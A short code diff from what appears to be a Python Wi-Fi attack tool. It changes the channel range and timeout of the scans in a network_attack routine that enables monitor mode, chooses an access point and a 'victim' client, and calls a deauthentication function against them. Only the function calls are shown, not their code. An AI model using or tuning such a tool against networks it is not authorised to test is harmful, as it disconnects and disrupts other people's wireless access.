@@ -255,7 +255,7 @@ def network_attack(iface):
     # change_modes.init_attack_mode()
     change_modes.activate_monitor_mode(iface)
 
-    scan_wlan(iface, channel_range=8, timeout=5)
+    scan_wlan(iface, channel_range=15, timeout=3)
     chosen_ap = scan_captured_networks(ap_list, flag=False)
 
     # Found Access Points
@@ -267,7 +267,7 @@ def network_attack(iface):
         else:
             sys.exit(1)
 
-    scan_for_users(iface, channel_range=10, timeout=6)
+    scan_for_users(iface, channel_range=15, timeout=3)
     victim = choose_user_to_attack(users)
 
     deauthenticate_victim(iface, victim, chosen_ap_mac, channel=chosen_ap[2])
